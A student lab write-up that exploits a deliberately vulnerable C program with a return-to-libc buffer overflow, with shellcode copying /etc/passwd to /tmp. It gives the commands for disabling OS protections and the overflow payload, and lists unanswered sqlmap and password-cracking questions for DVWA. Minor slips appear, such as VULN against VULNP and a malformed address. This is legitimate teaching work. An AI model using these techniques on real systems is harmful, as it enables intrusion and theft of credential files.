# Lab #1,22110031, Bien Xuan Huy, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    char local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: 

### 1. Preparation

I saved the vulnerable C program in a file named env.c and shellcode in task1.asm.
In order to attack, I will first convert the task1.asm into machine code using the following commands. 

```
nasm -g -f elf task1.asm
ld -m elf_i386 -o task1 task1.o
```

My idea is I will use system() to execute shellcode in task1, which generated above. In order to to that, I need to overflow the buffer memory to higher addresses, which will redirect my program flow to execute shellcode in task1 as expected.

Consider the stack frame of the main function of env.c.

<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/df4e5886a438efa58ca5f62a86a4dca38be1529f/images/task1/mainstackframe.png"><br>

I will replace data in return address with the address of system(), set argc to the address of exit(). Since task1 is placed on disk so in order to run it I will saved its path in an environment variable named VULNP, then place address of that variable in argv. This way, when the program returns, it will run system() as the return address is popped off the stack.

Command to create environment variable:

```
export VULN=/home/seed/seclabs/bof/task1
```

### 2. Build the attack

Now I need to find three things: address of system(), address of exit(), address of VULNP. Here're the steps:

#### 1. Compile env.c and turn off countermeasure factors in OS 

Compiling env.c with some options such as disabling the stack protector and allowing execution on stack:

```
gcc -g env.c -o env.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
```

Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04:

```
sudo ln -sf /bin/zsh /bin/sh
```

Turn off OS's address space layout randomization 

```
sudo sysctl -w kernel.randomize_va_space=0
```

#### 2. Load program into gdb and find necessary addresses

Run the env.out

```
gdb -q env.out
start
```

Then, run these two following commands to find addresses of system() and exit():

```
p system
p exit
```

Also run this command to get address of VULNP variable:

```
print getenv("VULNP")
```

Here's the result:

<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/7d75e56e9344244e6cea9989841ee95f6f4dbb36/images/task1/getAddress.jpg"><br>

Observing the results:
* Address of system(): 0xf7e50db0
* Address of exit(): 0xf7e449e0
* Address of VULNP: 0xffffdf04x

#### 3. Conduct the attack

Note that we need to overflow the addresses in little-endian format. The most important thing is that we can only run this command while loading the program in gdb, as the address of VULNP will be different outside of it.

Here’s the attack command:

```
run $(python -c "print('a' * 20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x04\xdf\xff\xff')")
```

The first 20 bytes will overflow the buffer memory and the ebp, followed by the addresses we expect.

After running command, here's the result:

<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/e65982fbe770327e1d679d0c11722709e044e243/images/task1/result.jpg"><br>

As we can clearly see, a file named outfile is created in /tmp/ as expected.

Inspect outfile using this command (when still in the /tmp/ folder):

```
cat outfile
```
Result:

<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/2562028aa8e07a5365f2f3d537dda862ca804e06/images/task1/catResult.jpg"><br>

The content of /etc/passwd is copied to this file.

To check 

**Conclusion**: Task successfully.

# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:



